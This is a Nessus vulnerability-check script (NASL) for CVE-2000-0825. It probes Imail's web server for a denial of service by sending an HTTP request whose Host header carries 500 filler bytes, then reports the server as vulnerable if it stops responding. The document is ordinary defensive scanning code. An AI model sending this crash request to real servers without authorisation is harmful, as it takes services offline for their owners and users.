#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#


include("compat.inc");

if(description)
{
 script_id(10496);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2000-0825");
 script_bugtraq_id(2011);
 
 script_name(english:"Imail Host: Header Field Handling Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server crashes when it is issued a too
long argument to the 'Host:' field of an HTTP request.

An attacker may use this flaw to either completely prevent
this host from serving web pages to the world, or to
make it die by crashing several threads of the web server
until the complete exhaustion of this host memory" );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=96659012127444&w=2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Imail 6.0.4 or later, as this reportedly fixes the issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();
 script_summary(english:"Web server buffer overflow");
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl");
  script_require_ports("Services/www",80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

function check_port(port)
{
 local_var soc;
 global_var port;

 if(get_port_state(port))
 {
 soc = http_open_socket(port);
 if(soc){
 	http_close_socket(soc);
	return(TRUE);
	}
  }
  return(FALSE);
}


port = 8181;
if(!(check_port(port:port)))
{
 port = 8383;
 if(!(check_port(port:port)))
 {
  port = get_http_port(default:80);

 }
}


if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  
  req = http_get(item:"/", port:port);
  if("Host" >< req)
  {
   req = ereg_replace(pattern:"(Host: )(.*)",
   		      string:req,
		      replace:"\1"+crap(500));
   req = req + string("\r\n\r\n");	
  }
  else
  {
   req = req - string("\r\n\r\n");
   req = req + string("\r\nHost: ", crap(500), "\r\n\r\n");
  }
 
 
  soc = http_open_socket(port);
  if(soc)
  {
    send(socket:soc, data:req);
    r = http_recv(socket:soc);
   
    http_close_socket(soc);
    if(!r){
      	security_warning(port);
	exit(0);
    }
  }
}

